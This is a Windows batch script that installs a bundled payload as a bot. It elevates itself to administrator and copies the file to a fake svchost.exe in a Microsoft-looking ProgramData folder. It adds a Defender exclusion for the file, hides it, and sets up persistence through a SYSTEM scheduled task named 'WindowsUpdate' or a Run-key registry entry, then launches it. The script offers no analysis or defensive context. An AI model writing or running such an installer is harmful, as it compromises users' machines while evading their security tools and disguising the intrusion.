@echo off
setlocal enabledelayedexpansion

REM Run as admin automatically
net session >nul 2>&1
if %errorLevel% neq 0 (
    powershell -Command "Start-Process cmd -ArgumentList '/c \"%~f0\"' -Verb RunAs"
    exit /b
)

set "TARGET=%ProgramData%\Microsoft\Network\Diagnostics\svchost.exe"

REM Create directory and copy file
mkdir "%ProgramData%\Microsoft\Network\Diagnostics" 2>nul
copy "%~dp0_Data\system.tmp" "%TARGET%" >nul 2>&1

if not exist "%TARGET%" (
    echo ERROR: Failed to copy file!
    pause
    exit /b 1
)

REM Add exclusion and make hidden
powershell -Command "Add-MpPreference -ExclusionPath '%TARGET%' -Force" >nul 2>&1
attrib +h +s "%TARGET%" >nul 2>&1

REM Create scheduled task (persistence)
echo Creating scheduled task...
schtasks /Create /SC ONLOGON /TN "WindowsUpdate" /TR "%TARGET%" /RU SYSTEM /RL HIGHEST /F >nul 2>&1

if errorlevel 1 (
    echo ERROR: Failed to create scheduled task!
    echo Trying alternative method...
    
    REM Fallback: registry persistence
    reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsUpdateService" /t REG_SZ /d "%TARGET%" /f >nul 2>&1
    if errorlevel 1 (
        echo ERROR: Failed to set up persistence!
        pause
        exit /b 1
    ) else (
        echo SUCCESS: Registry persistence set
    )
else (
    echo SUCCESS: Scheduled task created
)

REM Start the service
echo Starting service...
start "" /B "%TARGET%"

echo.
echo [SUCCESS] Deployment completed!
echo Bot should now run on system startup.
echo.
pause